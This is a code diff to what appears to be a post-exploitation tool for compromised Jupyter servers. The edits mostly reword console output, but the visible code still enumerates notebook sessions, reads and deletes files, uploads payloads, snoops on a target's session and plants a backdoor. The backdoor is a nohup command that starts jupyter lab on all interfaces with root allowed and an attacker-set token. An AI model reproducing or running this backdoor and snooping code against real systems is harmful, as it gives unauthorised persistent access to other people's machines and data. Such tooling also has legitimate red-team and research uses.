@@ -10,7 +10,7 @@ class Mixin:
         session_info = dict()
         self.sessions = self.connection.list_running_jpy_sessions()
         if len(self.sessions) == 0:
-            self.connection.con.print("No running notebooks to attach to")
+            self.connection.print_with_rule("No running notebooks to attach to")
         else:
             for s in self.sessions:
                 name = self.connection.jpy_sessions[s]["name"]
@@ -91,22 +91,24 @@ class Mixin:
                     print_out=False,
                 )
             )
-            self.connection.con.print(f"Backdoor established on {port}")
+            self.connection.print_with_rule(f"Backdoor attempted on {port}")
         else:
-            print("Target needed for backdoor")
+            self.connection.print_with_rule("Target needed for backdoor")
             if self.pick_target():
                 self.jupyter_backdoor(port=port, secret=secret)
             else:
-                self.connection.con.print("Attempting to spawn Jupyter from shell")
-                self.connection.con.print("May fail due to missing dependencies")
-                self.connection.con.print("Verify success manually")
+                self.connection.print_with_rule(
+                    "Attempting to spawn Jupyter from shell"
+                )
+                self.connection.print_with_rule("May fail due to missing dependencies")
+                self.connection.print_with_rule("Verify success manually")
                 launch_jupyter = f"nohup jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &"
                 loop.run_until_complete(
                     run_ephemeral_terminal(
                         self.connection, launch_jupyter, stdout=False
                     )
                 )
-                self.connection.con.print(f"Backdoor established on {port}")
+                self.connection.print_with_rule(f"Backdoor attempted on {port}")
 
     def dump_history(self):
         loop = asyncio.get_event_loop()
@@ -140,21 +142,21 @@ class Mixin:
             for s in self.connection.jpy_sessions:
                 name = self.connection.jpy_sessions[s]["name"]
                 last_active = f"Last Active: {self.connection.jpy_sessions[s]['kernel']['last_activity']}"
-                self.connection.con.print(f"{name:<20} {last_active:<30}" + "\n")
+                self.connection.print_with_rule(f"{name:<20} {last_active:<30}" + "\n")
         else:
-            self.connection.con.print("No running notebooks")
+            self.connection.print_with_rule("No running notebooks")
 
     def list_dir(self):
         dir = [
             inquirer.Text(
                 "dir",
-                "What directory would you like to list (relative to the Jupyter directory)?\nYou can also use this to read plaintext files.",
+                "What directory or file would you like to list?",
                 default="/",
             )
         ]
         answers = inquirer.prompt(dir)
         results = self.connection.list_dir(answers["dir"])
-        self.connection.con.print_json(json.dumps(results))
+        self.connection.print_with_rule(json.dumps(results), json=True)
 
     def upload(self):
         payload = [
@@ -179,7 +181,7 @@ class Mixin:
             "path": answer["path"],
             "type": "file",
         }
-        self.connection.con.print(
+        self.connection.print_with_rule(
             self.connection.upload(answer["path"], json.dumps(data))
         )
 
@@ -188,13 +190,13 @@ class Mixin:
         answer = inquirer.prompt(target)
         response = self.connection.delete(answer["path"])
         if response.status_code == 204:
-            self.connection.con.print(f"{answer["path"]} deleted successfully")
+            self.connection.print_with_rule(f"{answer["path"]} deleted successfully")
         else:
-            self.connection.con.print(f"Error deleting {answer["path"]}")
+            self.connection.print_with_rule(f"Error deleting {answer["path"]}")
 
     def snoop_for(self):
         if not self.target:
-            self.connection.con.print("You must select a target to snoop on")
+            self.connection.print_with_rule("You must select a target to snoop on")
             self.pick_target()
             self.snoop_for()
         else:
@@ -207,9 +209,10 @@ class Mixin:
             try:
                 int(answer["seconds"])
             except (ValueError, KeyboardInterrupt):
-                self.connection.con.print("Please specify a timeout in seconds")
+                self.connection.print_with_rule("Please specify a timeout in seconds")
                 self.menu()
             loop = asyncio.get_event_loop()
-            loop.run_until_complete(
-                snoop(self.connection, self.target, timeout=int(answer["seconds"]))
-            )
+            with self.connection.con.status("Snooping..."):
+                loop.run_until_complete(
+                    snoop(self.connection, self.target, timeout=int(answer["seconds"]))
+                )
